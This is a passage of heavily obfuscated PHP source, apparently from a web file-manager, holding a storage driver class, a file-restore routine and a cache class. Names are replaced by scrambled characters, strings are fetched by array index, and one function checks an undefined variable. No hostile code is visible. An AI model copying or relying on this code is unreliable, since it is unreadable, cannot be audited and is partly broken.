$¦şÃ½Ùª = $this->infoSimple($´€Œ¤); return $¦şÃ½Ùª ? $¦şÃ½Ùª[$_SERVER[ïÃ°£«Ê][190]] : !1; } public function pathThis($§õÚ†©‰) { $¦¬»İÅ‰ = $this->infoSimple($§õÚ†©‰); return $¦¬»İÅ‰ ? $¦¬»İÅ‰[$_SERVER[ïÃ°£«Ê][32]] : !1; } public function getPathOuter($ÌÏº“„) { if (!$ÌÏº“„) { return $ÌÏº“„; } $¯ëø†°Ñ = $this->parse($ÌÏº“„); return KodIO::make($¯ëø†°Ñ[$_SERVER[ïÃ°£«Ê][487]]); } public function copyFolderFromIO($Ùß•ñ€ƒ, $İşÒÅ°î, $œü˜ò‹É, $‰ØÖÚ, $×ÃğÁßà) { $ÈæÀï = $this->model->copyFolderFromIO($Ùß•ñ€ƒ, $İşÒÅ°î, $œü˜ò‹É, $‰ØÖÚ, $×ÃğÁßà); return KodIO::make($ÈæÀï); } public function isParentOf($ÓÖò¦ÕÎ, $ØàÏ®­™) { return $this->model->isParentOf($ÓÖò¦ÕÎ, $ØàÏ®­™); } public function mkfile($—¤™éÊ, $Åó©±úĞ = '', $öĞö‹ = REPEAT_RENAME) { $¤ÙÎ»ÁŸ =& $_SERVER[ïÃ°£«Ê]; $ÃËêÒŸÖ = $this->parse($—¤™éÊ); $—¤™éÊ = $ÃËêÒŸÖ[$¤ÙÎ»ÁŸ[487]]; for ($ÙÚ«Ôã‹ = 0; $ÙÚ«Ôã‹ < count($ÃËêÒŸÖ[$¤ÙÎ»ÁŸ[1536]]); $ÙÚ«Ôã‹++) { $éÉÏƒû = $ÃËêÒŸÖ[$¤ÙÎ»ÁŸ[1536]][$ÙÚ«Ôã‹]; if ($ÙÚ«Ôã‹ == count($ÃËêÒŸÖ[$¤ÙÎ»ÁŸ[1536]]) - 1) { $—¤™éÊ = $this->model->mkfile($—¤™éÊ, $éÉÏƒû, $Åó©±úĞ, $öĞö‹); break; } $—¤™éÊ = $this->model->mkdir($—¤™éÊ, $éÉÏƒû, REPEAT_SKIP); } return $this->getPathOuter($—¤™éÊ); } public function mkdir($‡çÙ—ç, $éÑ¥è™Õ = REPEAT_SKIP) { $¬ãàèêé =& $_SERVER[ïÃ°£«Ê]; $Â‡Ğµ—‹ = $this->parse($‡çÙ—ç); $‡çÙ—ç = $Â‡Ğµ—‹[$¬ãàèêé[487]]; for ($ıöÜ÷ïƒ = 0; $ıöÜ÷ïƒ < count($Â‡Ğµ—‹[$¬ãàèêé[1536]]); $ıöÜ÷ïƒ++) { $¶Æ®½ªü = $Â‡Ğµ—‹[$¬ãàèêé[1536]][$ıöÜ÷ïƒ]; $‡çÙ—ç = $this->model->mkdir($‡çÙ—ç, $¶Æ®½ªü, $éÑ¥è™Õ); } return $this->getPathOuter($‡çÙ—ç); } public function copyFile($óéÍÊÅ”, $¤ü¥å‡, $¿›àÁÆ” = REPEAT_REPLACE) { $ô™Ó†ñ´ =& $_SERVER[ïÃ°£«Ê]; $°üÌİş« = $this->parse($¤ü¥å‡); $®‡ÊÚ»“ = $this->model->copy($óéÍÊÅ”, $°üÌİş«[$ô™Ó†ñ´[487]], $¿›àÁÆ”, $°üÌİş«[$ô™Ó†ñ´[87]]); return $®‡ÊÚ»“ ? $this->getPathOuter($®‡ÊÚ»“) : !1; } public function moveFile($Š‘Êø©Ì, $ÜĞÂşÅŞ, $¬Ğ»¼Õä = REPEAT_REPLACE) { $‡‡ù¼— =& $_SERVER[ïÃ°£«Ê]; $ğĞ’×…ñ = $this->parse($ÜĞÂşÅŞ); $õêéã¡ = $this->model->move($Š‘Êø©Ì, $ğĞ’×…ñ[$‡‡ù¼—[487]], $¬Ğ»¼Õä, $ğĞ’×…ñ[$‡‡ù¼—[87]]); return $õêéã¡ ? $this->getPathOuter($õêéã¡) : !1; } public function copy($÷ëäÙù‚, $é•…Ì¢è, $¹öÏ²¸Ş = REPEAT_REPLACE, $Ïºß²° = false) { $¶Üµ¿™ = $this->parse($é•…Ì¢è); $°”Øõ© = $this->model->copy($÷ëäÙù‚, $¶Üµ¿™[$_SERVER[ïÃ°£«Ê][487]], $¹öÏ²¸Ş, $Ïºß²°); return $°”Øõ© ? $this->getPathOuter($°”Øõ©) : !1; } public function moveSameAllow() { } public function move($Äºâ•¾¥, $˜Û—„Õï, $şâ‘ïìá = REPEAT_REPLACE, $È‘ØÍİ† = false) { $’—ñ®Õå = $this->parse($˜Û—„Õï); $¥‹ç¿½ù = $this->model->move($Äºâ•¾¥, $’—ñ®Õå[$_SERVER[ïÃ°£«Ê][487]], $şâ‘ïìá, $È‘ØÍİ†); return $¥‹ç¿½ù ? $this->getPathOuter($¥‹ç¿½ù) : !1; } public function remove($¼ÕÎ«éº, $•Êø° = true) { return $this->model->remove($¼ÕÎ«éº, $•Êø°); } public function rename($ŒÛºŠğ‰, $ôë¦‹™) { $æ¼Òã‡§ = $this->model->rename($ŒÛºŠğ‰, $ôë¦‹™); return $æ¼Òã‡§ ? $this->getPathOuter($ŒÛºŠğ‰) : $æ¼Òã‡§; } public function size($¦—éâ÷ø) { $’Â—óâ¿ = $this->infoSimple($¦—éâ÷ø); return $’Â—óâ¿ ? $’Â—óâ¿[$_SERVER[ïÃ°£«Ê][79]] : 0; } public function infoSimple($”âšîÃÚ) { return $this->model->sourceInfo($”âšîÃÚ); } public function info($Æ ¯ö´È) { return $this->infoParse($Æ ¯ö´È); } public function infoAuth($‚‰ˆ‹ú) { return $this->infoParse($‚‰ˆ‹ú, !1, !0); } public function infoWithChildren($òÈ³óùÕ) { return $this->infoParse($òÈ³óùÕ, !0); } protected function infoParse($çŸÓ¾ï, $âûÑú¾¡ = false, $¶˜ëŸæ = false) { if (!$âûÑú¾¡) { return $this->model->pathInfo($çŸÓ¾ï, $¶˜ëŸæ); } return $this->model->pathInfoMore($çŸÓ¾ï); } public function infoFullSimple($î¬ÌÚ›) { $¶ç¢èÛ =& $_SERVER[ïÃ°£«Ê]; $ÅÜˆáÛó = explode($¶ç¢èÛ[8], $î¬ÌÚ›); $Ÿò¬öÂâ = implode($¶ç¢èÛ[8], array_splice($ÅÜˆáÛó, 1)); return $this->model->pathInfoByPath($ÅÜˆáÛó[0], $Ÿò¬öÂâ); } public function infoFull($©£Â˜œµ) { $¡ç€±Î = $this->infoFullSimple($©£Â˜œµ); return is_array($¡ç€±Î) ? $this->model->pathInfo($¡ç€±Î[$_SERVER[ïÃ°£«Ê][191]]) : !1; } public function hashSimple($ÀËûèšï) { $½şÃ§óĞ =& $_SERVER[ïÃ°£«Ê]; $£ò¼Öøí = $this->infoWithChildren($ÀËûèšï); return $£ò¼Öøí[$½şÃ§óĞ[167]][$½şÃ§óĞ[694]]; } public function hashMd5($Ñì¥”è ) { $Š—˜ó¬ =& $_SERVER[ïÃ°£«Ê]; $öÛæ«ñ = $this->infoWithChildren($Ñì¥”è ); return $öÛæ«ñ[$Š—˜ó¬[167]][$Š—˜ó¬[563]]; } public function exist($Ùşï‚À‘) { $ï–•—Õõ =& $_SERVER[ïÃ°£«Ê]; $Ï×†‘­ô = $this->parse($Ùşï‚À‘); if (!$Ï×†‘­ô[$ï–•—Õõ[87]]) { return $this->isFile($Ùşï‚À‘) || $this->isFolder($Ùşï‚À‘); } $Ìúë•ÑÚ = array($ï–•—Õõ[492] => $Ï×†‘­ô[$ï–•—Õõ[487]], $ï–•—Õõ[32] => $Ï×†‘­ô[$ï–•—Õõ[87]]); $ˆà‹­¯ = $this->model->where($Ìúë•ÑÚ)->find(); return $ˆà‹­¯ ? !0 : !1; } public function isFile($•ŞÂÏ±Ä) { $›Áåøö³ =& $_SERVER[ïÃ°£«Ê]; $ü¹°ÏÅ¨ = $this->infoSimple($•ŞÂÏ±Ä); return $ü¹°ÏÅ¨ && $ü¹°ÏÅ¨[$›Áåøö³[500]] == $›Áåøö³[228] ? !0 : !1; } public function isFolder($²å·Òä) { $Ğ¿ïçáØ =& $_SERVER[ïÃ°£«Ê]; $ãä²¾‚ = $this->infoSimple($²å·Òä); return $ãä²¾‚ && $ãä²¾‚[$Ğ¿ïçáØ[500]] == $Ğ¿ïçáØ[91] ? !0 : !1; } public function listPath($åğ†šşë, $Ó´ÙË² = false) { $·«şü =& $_SERVER[ïÃ°£«Ê]; if ($åğ†šşë == $·«şü[12]) { return !1; } $¬…×ü Ú = array($·«şü[492] => $åğ†šşë); if ($Ó´ÙË²) { return $this->model->listSource($¬…×ü Ú, -1); } return $this->model->listSource($¬…×ü Ú); } public function has($ÇŸÊĞ·÷, $§Ò‚ ³ = false, $È’‡ÎàÑ = null) { $¨Æı“ÊÙ =& $_SERVER[ïÃ°£«Ê]; $€Ö‘˜â = $this->infoWithChildren($ÇŸÊĞ·÷); if ($§Ò‚ ³) { return array($¨Æı“ÊÙ[240] => $€Ö‘˜â[$¨Æı“ÊÙ[240]], $¨Æı“ÊÙ[239] => $€Ö‘˜â[$¨Æı“ÊÙ[239]]); } return $È’‡ÎàÑ ? $€Ö‘˜â[$¨Æı“ÊÙ[240]] : $€Ö‘˜â[$¨Æı“ÊÙ[239]]; } public function listAll($Ñ‘©õŠ‘) { $”şª»ú = IO::info($this->pathParse[$_SERVER[ïÃ°£«Ê][87]]); if (!$”şª»ú) { return array(); } return $this->model->listAll($Ñ‘©õŠ‘); } public function getContent($œİ‹à“) { return $this->model->getContent($œİ‹à“); } public function setContent($Ôµ÷Ôğ¶, $ÎÌÄÌ¤Ë = '') { return $this->model->setContent($Ôµ÷Ôğ¶, $ÎÌÄÌ¤Ë); } public function fileSubstr($×ì¾˜, $®ı­ñ, $åºåâ·) { return $this->model->fileSubstr($×ì¾˜, $®ı­ñ, $åºåâ·); } public function download($¨¬¿èÒí, $Ç¯‘õ¬Ô = '') { $¨¼Á”Êü = get_path_father($Ç¯‘õ¬Ô); $ëëÌŸêš = get_path_this($Ç¯‘õ¬Ô); $Ã­„š‚Š = $this->model->fileInfoGet($¨¬¿èÒí); $ËÄªèÃ¾ = IO::copy($Ã­„š‚Š[$_SERVER[ïÃ°£«Ê][87]], $¨¼Á”Êü, !1, $ëëÌŸêš); return $ËÄªèÃ¾; } public function setModifyTime($±í½Úşš, $Ö÷“ÉØ = '') { $î¡İ”«– =& $_SERVER[ïÃ°£«Ê]; if (!$±í½Úşš) { return; } $this->model->where(array($î¡İ”«–[506] => $±í½Úşš))->save(array($î¡İ”«–[88] => $Ö÷“ÉØ)); } public function upload($Ó¬àìÉô, $Âï‹æñü, $Á±òœ¸å = false, $İÙ¥Í¬ = REPEAT_REPLACE) { $ÄÅŒ‚¿† =& $_SERVER[ïÃ°£«Ê]; $ûŠÀïÛë = $this->parse($Ó¬àìÉô); $€ç³Şš© = $this->model->addFile($ûŠÀïÛë[$ÄÅŒ‚¿†[487]], $Âï‹æñü, $ûŠÀïÛë[$ÄÅŒ‚¿†[87]], $Á±òœ¸å, $İÙ¥Í¬); return $this->getPathOuter($€ç³Şš©); } public function uploadFileByID($‚õ¾ŞÛ®, $€¦Áãã, $şª§áÅ) { $©½ÀÇîû =& $_SERVER[ïÃ°£«Ê]; $ñšè­¤Ò = $this->parse($‚õ¾ŞÛ®); $æ—û©ıè = $this->model->addFileByFileID($ñšè­¤Ò[$©½ÀÇîû[487]], $€¦Áãã, $ñšè­¤Ò[$©½ÀÇîû[87]], $şª§áÅ); return $this->getPathOuter($æ—û©ıè); } public function addFileByRemote($òˆá¡°í, $öìÜ–Ùı, $±…ëß³ = array(), $Óæ’Š¿å = '', $ëÌÑ´İ×) { $àƒ­—‚ˆ =& $_SERVER[ïÃ°£«Ê]; $œ—ùÍé¡ = $this->parse($òˆá¡°í); $Óæ’Š¿å = empty($Óæ’Š¿å) ? $œ—ùÍé¡[$àƒ­—‚ˆ[87]] : $Óæ’Š¿å; $¨¾ø¥Ò = $this->model->addFileByRemote($œ—ùÍé¡[$àƒ­—‚ˆ[487]], $öìÜ–Ùı, $Óæ’Š¿å, $±…ëß³, $ëÌÑ´İ×); return $this->getPathOuter($¨¾ø¥Ò); } public function uploadLink($ÕŞ¶àœ, $Ó•°øÇò = 0) { $±ØÂ›®ï =& $_SERVER[ïÃ°£«Ê]; $¨õõá€Ë = $this->parse($ÕŞ¶àœ); $½Şù…ñÒ = _get($GLOBALS[$±ØÂ›®ï[7]], $±ØÂ›®ï[1537]); $ú¤§şÑö = _get($GLOBALS[$±ØÂ›®ï[7]], $±ØÂ›®ï[1538]); $í¾ÙŞ´» = KodIO::ioFileDriverGet($±ØÂ›®ï[498] . $¨õõá€Ë[$±ØÂ›®ï[487]] . $±ØÂ›®ï[402]); $ãÎà’Ö = Model($±ØÂ›®ï[696])->createFileName($¨õõá€Ë[$±ØÂ›®ï[87]], $í¾ÙŞ´», $½Şù…ñÒ, $ú¤§şÑö); return IO::uploadLink($ãÎà’Ö, $Ó•°øÇò); } public function fileNameAuto($ÖÆŒ–”û, $áÄ³ªÉ, $·ÅÒ‹½“ = REPEAT_REPLACE, $Šˆ‹ë’ö = false) { return $this->model->fileNameAuto($ÖÆŒ–”û, $áÄ³ªÉ, $·ÅÒ‹½“, $Šˆ‹ë’ö); } public function fileNameExist($»ôÊ¾€Á, $ö‡ı£Ğ¦) { return $this->model->fileNameExist($»ôÊ¾€Á, $ö‡ı£Ğ¦); } protected function _fileOut($ıâ×½àğ, $¯ÆÎÇ¢ì = false, $‘íüµÙ = false, $–İÏ·ãŸ = '', $úÏıù¹ñ = false) { $òô Ò¶… =& $_SERVER[ïÃ°£«Ê]; $â²„Ö×¹ = $this->model->sourceInfo($ıâ×½àğ); if ($â²„Ö×¹[$òô Ò¶…[500]] == $òô Ò¶…[91]) { header($òô Ò¶…[1539]); die; } $é­–­š‰ = $this->model->fileInfoGet($ıâ×½àğ); $–İÏ·ãŸ = $é­–­š‰[$òô Ò¶…[563]] ? $é­–­š‰[$òô Ò¶…[563]] : $–İÏ·ãŸ; $ë¸Ï¹–š = isset($GLOBALS[$òô Ò¶…[180]]) && is_array($GLOBALS[$òô Ò¶…[180]]) ? $GLOBALS[$òô Ò¶…[180]][$òô Ò¶…[32]] : $â²„Ö×¹[$òô Ò¶…[32]]; if ($úÏıù¹ñ) { return IO::fileOutServer($é­–­š‰[$òô Ò¶…[87]], $¯ÆÎÇ¢ì, $ë¸Ï¹–š, $–İÏ·ãŸ); } IO::fileOut($é­–­š‰[$òô Ò¶…[87]], $¯ÆÎÇ¢ì, $ë¸Ï¹–š, $–İÏ·ãŸ); } public function fileOut($ìĞØµë, $­€ó½†Ø = false, $ÅÔÈ¬ƒ = false, $’Óñ®™ß = '') { $this->_fileOut($ìĞØµë, $­€ó½†Ø, $ÅÔÈ¬ƒ, $’Óñ®™ß); } public function fileOutServer($ßÇÄâ, $Šã¡ÁÒå = false, $“»¶¸óÁ = false, $¨Çöƒ–Ó = '') { $this->_fileOut($ßÇÄâ, $Šã¡ÁÒå, $“»¶¸óÁ, $¨Çöƒ–Ó, !0); } protected function _fileOutImage($èÉŞ’Ò¢, $‡âÚ†øÚ = 250) { $±Şç´’ =& $_SERVER[ïÃ°£«Ê]; $“×ù‹Íà = $this->model->pathInfo($èÉŞ’Ò¢); if ($“×ù‹Íà[$±Şç´’[500]] == $±Şç´’[91]) { show_json($±Şç´’[1540] . $èÉŞ’Ò¢, !1); } $Ùä§¡øæ = $this->model->fileInfoGet($èÉŞ’Ò¢); $“×ù‹Íà[$±Şç´’[181]] = $Ùä§¡øæ[$±Şç´’[87]]; $GLOBALS[$±Şç´’[180]] = $“×ù‹Íà; IO::fileOutImage($Ùä§¡øæ[$±Şç´’[87]], $‡âÚ†øÚ); } public function fileOutImage($Ÿ¶¬‚¶å, $³éĞã°ø = 250) { $this->_fileOutImage($Ÿ¶¬‚¶å, $³éĞã°ø); } public function fileOutImageServer($æšããÆş, $ñë†®…ê = 250) { $this->_fileOutImage($æšããÆş, $ñë†®…ê); } public function link($îÖÒ©, $­€¡ÏØÛ = '') { $Ï™ş€ï¿ = $this->model->fileInfoGet($îÖÒ©); return IO::link($Ï™ş€ï¿[$_SERVER[ïÃ°£«Ê][87]], $­€¡ÏØÛ); } protected function parse($†‹áÇÛí) { $»ßöÆâ© =& $_SERVER[ïÃ°£«Ê]; if (strstr($†‹áÇÛí, $»ßöÆâ©[8]) === !1) { return array($»ßöÆâ©[508] => intval($†‹áÇÛí), $»ßöÆâ©[87] => $»ßöÆâ©[12], $»ßöÆâ©[1536] => array()); } $·Œµıé® = explode($»ßöÆâ©[8], trim($†‹áÇÛí, $»ßöÆâ©[8])); if (count($·Œµıé®) < 2) { show_tips(clear_html($†‹áÇÛí) . $»ßöÆâ©[1541]); } return array($»ßöÆâ©[508] => intval($·Œµıé®[0]), $»ßöÆâ©[87] => $·Œµıé®[1], $»ßöÆâ©[1536] => array_slice($·Œµıé®, 1)); } } goto c§»Ç¹ìÒŸ; f÷Š…Ï™ñÑ: class RestoreFile { public $message; public function __construct() { } public function start($º‡˜ñãÁ) { $…‡¡«©’ =& $_SERVER[ïÃ°£«Ê]; $´¦¥Ïêõ = Model($…‡¡«©’[874]); if ($´¦¥Ïêõ->get($…‡¡«©’[962]) == $…‡¡«©’[963]) { $this->message = LNG($…‡¡«©’[964]); return !1; } $º‡˜ñãÁ = rtrim($º‡˜ñãÁ, $…‡¡«©’[8]) . $…‡¡«©’[8]; $Ñ„Òı¿Ñ = IO::listPath($º‡˜ñãÁ); if (empty($Ñ„Òı¿Ñ[$…‡¡«©’[85]]) && empty($Ñ„Òı¿Ñ[$…‡¡«©’[86]])) { show_json(LNG($…‡¡«©’[965]), !1); } $úåà¦ó = $…‡¡«©’[966]; $„üØ¿æä = Task::get($úåà¦ó); if ($„üØ¿æä) { if ($„üØ¿æä[$…‡¡«©’[851]] == $…‡¡«©’[940]) { $this->message = LNG($…‡¡«©’[967]); return !0; } Task::kill($úåà¦ó); } $ŠËÅ§¶ß = array($…‡¡«©’[87] => $º‡˜ñãÁ, $…‡¡«©’[557] => 0, $…‡¡«©’[204] => 0, $…‡¡«©’[857] => array($…‡¡«©’[860] => 0, $…‡¡«©’[941] => 0, $…‡¡«©’[865] => 0, $…‡¡«©’[942] => 0, $…‡¡«©’[943] => 0), $…‡¡«©’[968] => array($…‡¡«©’[860] => 0, $…‡¡«©’[941] => 0, $…‡¡«©’[943] => 0)); $—õÎà¬ = $´¦¥Ïêõ->get($…‡¡«©’[944], $…‡¡«©’[969]); $—õÎà¬ = json_decode($—õÎà¬, !0); if (!$—õÎà¬) { $—õÎà¬ = array(); } $—õÎà¬ = array_merge($ŠËÅ§¶ß, $—õÎà¬); if (_get($GLOBALS, $…‡¡«©’[970], 0) == $…‡¡«©’[91] || !$—õÎà¬[$…‡¡«©’[557]]) { $—õÎà¬ = $ŠËÅ§¶ß; } $øî¾úÀ = Model($…‡¡«©’[560]); $ïÒÇ¡ªò = array($…‡¡«©’[558] => array($…‡¡«©’[915], $—õÎà¬[$…‡¡«©’[557]])); $ç÷İˆ = $øî¾úÀ->field(array($…‡¡«©’[950] => $…‡¡«©’[951], $…‡¡«©’[952] => $…‡¡«©’[79]))->where($ïÒÇ¡ªò)->find(); if (!intval($ç÷İˆ[$…‡¡«©’[951]])) { $this->message = LNG($…‡¡«©’[971]); return !0; } $è»Ë‡Ÿš = intval($ç÷İˆ[$…‡¡«©’[951]]); $ƒ Ä§±Ò = intval($ç÷İˆ[$…‡¡«©’[79]]); $—õÎà¬[$…‡¡«©’[857]][$…‡¡«©’[860]] += $è»Ë‡Ÿš; $—õÎà¬[$…‡¡«©’[857]][$…‡¡«©’[865]] += $ƒ Ä§±Ò; $—õÎà¬[$…‡¡«©’[968]][$…‡¡«©’[860]] = $è»Ë‡Ÿš; $—õÎà¬[$…‡¡«©’[204]] = time(); $´¦¥Ïêõ->set($…‡¡«©’[944], $—õÎà¬, $…‡¡«©’[969]); $¿¹èÆéó = KodIO::defaultDriver(); $ÒÕ®²Ïû = $¿¹èÆéó[$…‡¡«©’[487]]; $ª™Ó´÷ = KodIO::makePath(KodIO::KOD_IO, $ÒÕ®²Ïû); $„üØ¿æä = new TaskFileTransfer($úåà¦ó, $…‡¡«©’[969], $è»Ë‡Ÿš, LNG($…‡¡«©’[972]) . $…‡¡«©’[889] . LNG($…‡¡«©’[919])); $„üØ¿æä->task[$…‡¡«©’[865]] = $ƒ Ä§±Ò; $¢ŞıÎ = 1000; $½à¸ÍÄ¤ = 1; $Úí‚²¨ú = $…‡¡«©’[923]; $Ñ„Òı¿Ñ = $øî¾úÀ->where($ïÒÇ¡ªò)->field($Úí‚²¨ú)->order($…‡¡«©’[924])->selectPage($¢ŞıÎ, $½à¸ÍÄ¤); $ÓŞ°í³ = intval($Ñ„Òı¿Ñ[$…‡¡«©’[443]][$…‡¡«©’[445]]); while ($Ñ„Òı¿Ñ && $½à¸ÍÄ¤ <= $ÓŞ°í³) { $ïì‹¦ˆ = array(); foreach ($Ñ„Òı¿Ñ[$…‡¡«©’[446]] as $ÈÀéµÙ) { $—õÎà¬[$…‡¡«©’[557]] = $ÈÀéµÙ[$…‡¡«©’[557]]; $—õÎà¬[$…‡¡«©’[857]][$…‡¡«©’[941]]++; $—õÎà¬[$…‡¡«©’[857]][$…‡¡«©’[942]] += $ÈÀéµÙ[$…‡¡«©’[79]]; $—õÎà¬[$…‡¡«©’[968]][$…‡¡«©’[941]]++; $ÈòùÖû = $ÈÀéµÙ[$…‡¡«©’[87]]; if (IO::exist($ÈòùÖû)) { $„üØ¿æä->update(1); continue; } $£Áüİ¾ = substr($ÈòùÖû, strlen("\x7b\151\157\x3a{$ÈÀéµÙ[$…‡¡«©’[927]]}\x7d\57")); $¼ÊÃØİ° = $ª™Ó´÷ . $£Áüİ¾; if ($ÒÕ®²Ïû != $ÈÀéµÙ[$…‡¡«©’[927]] && IO::exist($¼ÊÃØİ°)) { $„üØ¿æä->update(1); $ïì‹¦ˆ[$ÈÀéµÙ[$…‡¡«©’[557]]] = $¼ÊÃØİ°; continue; } $Áç­‚°ö = $º‡˜ñãÁ . $£Áüİ¾; if (!$this->isFileExist($Áç­‚°ö)) { $„üØ¿æä->update(1); $—õÎà¬[$…‡¡«©’[857]][$…‡¡«©’[943]]++; $—õÎà¬[$…‡¡«©’[968]][$…‡¡«©’[943]]++; write_log($…‡¡«©’[973] . $Áç­‚°ö, $…‡¡«©’[974]); continue; } $¿¹×ƒ«à = get_path_father($¼ÊÃØİ°); IO::mkdir($¿¹×ƒ«à); if (!IO::copy($Áç­‚°ö, $¿¹×ƒ«à, REPEAT_SKIP)) { $—õÎà¬[$…‡¡«©’[857]][$…‡¡«©’[943]]++; $—õÎà¬[$…‡¡«©’[968]][$…‡¡«©’[943]]++; write_log($…‡¡«©’[975] . $Áç­‚°ö . $…‡¡«©’[976] . $ÈÀéµÙ[$…‡¡«©’[557]], $…‡¡«©’[974]); } else { $ïì‹¦ˆ[$ÈÀéµÙ[$…‡¡«©’[557]]] = $¼ÊÃØİ°; } $„üØ¿æä->update(1); } $this->updateFileBatch($—õÎà¬, $ïì‹¦ˆ, $ÒÕ®²Ïû); $½à¸ÍÄ¤++; $Ñ„Òı¿Ñ = $øî¾úÀ->where($ïÒÇ¡ªò)->field($Úí‚²¨ú)->order($…‡¡«©’[924])->selectPage($¢ŞıÎ, $½à¸ÍÄ¤); } $„üØ¿æä->end(); $this->updateFileBatch($—õÎà¬, $ïì‹¦ˆ, $ÒÕ®²Ïû); $Ñ„Òı¿Ñ = Model($…‡¡«©’[869])->listData(); $ãÂçÖÎ = array_to_keyvalue($Ñ„Òı¿Ñ, $…‡¡«©’[12], $…‡¡«©’[487]); $£á£ìó¤ = md5($…‡¡«©’[977] . implode($…‡¡«©’[50], $ãÂçÖÎ)); Cache::remove($£á£ìó¤); return !0; } private function isFileExist($ü´Èàšˆ) { static $ıªù§Ş = null; if (is_null($×ôøÄ£)) { $ıªù§Ş = array(); } $à•Üª–ù = get_path_father($ü´Èàšˆ); if (in_array($à•Üª–ù, $ıªù§Ş)) { return !1; } if (!IO::exist($à•Üª–ù)) { $ıªù§Ş[] = $à•Üª–ù; return !1; } return IO::exist($ü´Èàšˆ); } private function updateFileBatch($Ù¾òÂ¡Ò, &$£œá¼î‹, $°ÚÄõ·ã) { $¤•ÖõÃà =& $_SERVER[ïÃ°£«Ê]; Model($¤•ÖõÃà[874])->set($¤•ÖõÃà[944], $Ù¾òÂ¡Ò, $¤•ÖõÃà[969]); if (!$£œá¼î‹) { return; } $òÎÒŞÚú = Model($¤•ÖõÃà[560]); $ìÖšö°• = $”•Á‹øÄ = array(); foreach ($£œá¼î‹ as $´Ğå¼²¤ => $‚—’Ÿ¿ƒ) { $ìÖšö°•[] = array($¤•ÖõÃà[557], $´Ğå¼²¤, $¤•ÖõÃà[927], $°ÚÄõ·ã); $”•Á‹øÄ[] = array($¤•ÖõÃà[557], $´Ğå¼²¤, $¤•ÖõÃà[87], $‚—’Ÿ¿ƒ); } $òÎÒŞÚú->saveAll($ìÖšö°•); $òÎÒŞÚú->saveAll($”•Á‹øÄ); write_log($¤•ÖõÃà[978] . count($£œá¼î‹) . $¤•ÖõÃà[979] . $°ÚÄõ·ã, $¤•ÖõÃà[974]); $£œá¼î‹ = array(); } private function updateFile($‡¡ªÚÏô, $ ¼é€Á, $ûÆ š’, $ŸİËë‘) { $ƒùÊ‰çê =& $_SERVER[ïÃ°£«Ê]; $ŒŒ„ı = array($ƒùÊ‰çê[927] => $ ¼é€Á, $ƒùÊ‰çê[87] => $ûÆ š’); $ªşÅ±ƒå = $ŸİËë‘->where(array($ƒùÊ‰çê[557] => $‡¡ªÚÏô))->save($ŒŒ„ı); if ($ªşÅ±ƒå) { return; } write_log($ƒùÊ‰çê[980] . $‡¡ªÚÏô, $ƒùÊ‰çê[974]); } } class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $ô ½ì÷¶ =& $_SERVER[ïÃ°£«Ê]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $¡÷ë•¦ş = $GLOBALS[$ô ½ì÷¶[6]][$ô ½ì÷¶[424]]; $êë‘‰Ç¯ = $¡÷ë•¦ş[$¡÷ë•¦ş[$ô ½ì÷¶[981]]]; $ƒÛÇ¼¼² = $¡÷ë•¦ş[$ô ½ì÷¶[982]]; switch ($¡÷ë•¦ş[$ô ½ì÷¶[981]]) { case $ô ½ì÷¶[21]: self::$handle = Model($ô ½ì÷¶[983]); break; case $ô ½ì÷¶[984]: self::$handle = new CacheRedis($êë‘‰Ç¯, $ƒÛÇ¼¼²); break; case $ô ½ì÷¶[985]: self::$handle = new CacheMemcached($êë‘‰Ç¯, $ƒÛÇ¼¼²); break; case $ô ½ì÷¶[230]: self::$handle = new CacheFile($êë‘‰Ç¯, $ƒÛÇ¼¼²); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¤»ï„ ñ) { if (is_array($¤»ï„ ñ) || is_object($¤»ï„ ñ)) { $¤»ï„ ñ = json_encode($¤»ï„ ñ); } $¤»ï„ ñ = rawurlencode($¤»ï„ ñ); return md5(KOD_SITE_ID . $_SERVER[ïÃ°£«Ê][11] . $¤»ï„ ñ); } public static function get($Ó¨ÌÉ³è, $ÆÊüŞŞÅ = false) { $ö×¦¦â = self::key($Ó¨ÌÉ³è); $Óãóö·´ = self::init(); if ($ÆÊüŞŞÅ) { return unserialize($Óãóö·´->get($ö×¦¦â)); } if (!isset(self::$memoryCache[$ö×¦¦â])) { $°ô¨ìÛ¾ = $Óãóö·´->get($ö×¦¦â); self::$memoryCache[$ö×¦¦â] = unserialize($°ô¨ìÛ¾); } return self::$memoryCache[$ö×¦¦â]; } public static function set($µ’™şÓ, $°…‰Ù‚, $¾¢»Áâ = false) { $ Ñ¼»¢ =& $_SERVER[ïÃ°£«Ê]; $ş¸“ğå° = self::key($µ’™şÓ); if (isset(self::$memoryCache[$ş¸“ğå°]) && self::$memoryCache[$ş¸“ğå°] === $°…‰Ù‚) { return !0; } if ($¾¢»Áâ === 0) { self::$memoryCache[$ş¸“ğå°] = $°…‰Ù‚; return !0; } $§ÎÇøÇ‘ = self::init(); $÷°¤“ÎÖ = serialize($°…‰Ù‚); CacheLock::lock($µ’™şÓ . $ Ñ¼»¢[986]); $Ìò÷ËÂü = $§ÎÇøÇ‘->set($ş¸“ğå°, $÷°¤“ÎÖ, $¾¢»Áâ); self::$memoryCache[$ş¸“ğå°] = $°…‰Ù‚; CacheLock::unlock($µ’™şÓ . $ Ñ¼»¢[986]); return $Ìò÷ËÂü; } public static function getCall($¼ø‡Õî¶, $×¼¡öŸà, $¹¢ØÏÉŒ, $†‚÷¨„† = array()) { $úÑ™èê =& $_SERVER[ïÃ°£«Ê]; $Ø¬†€´ = self::get($¼ø‡Õî¶); if ($Ø¬†€´ || $Ø¬†€´ === $úÑ™èê[12]) { return $Ø¬†€´; } $Ø¬†€´ = call_user_func_array($¹¢ØÏÉŒ, $†‚÷¨„†); $Ø¬†€´ = $Ø¬†€´ ? $Ø¬†€´ : $úÑ™èê[12]; self::set($¼ø‡Õî¶, $Ø¬†€´, $×¼¡öŸà); return $Ø¬†€´; } public static function limitCall($ö¦¶œÅç, $œóÕØŸï = 15, $éıœè÷Ì = 30, $Ù¶ä‹İ‰ = true) { $Ã’ÙöšÓ =& $_SERVER[ïÃ°£«Ê]; static $§ÏİŒ†´ = array(); if ($Ù¶ä‹İ‰) { $ö¦¶œÅç = $ö¦¶œÅç . $Ã’ÙöšÓ[987] . KodUser::id() . $Ã’ÙöšÓ[988] . get_client_ip(); } if (isset($§ÏİŒ†´[$ö¦¶œÅç]) && is_array($§ÏİŒ†´[$ö¦¶œÅç])) { return 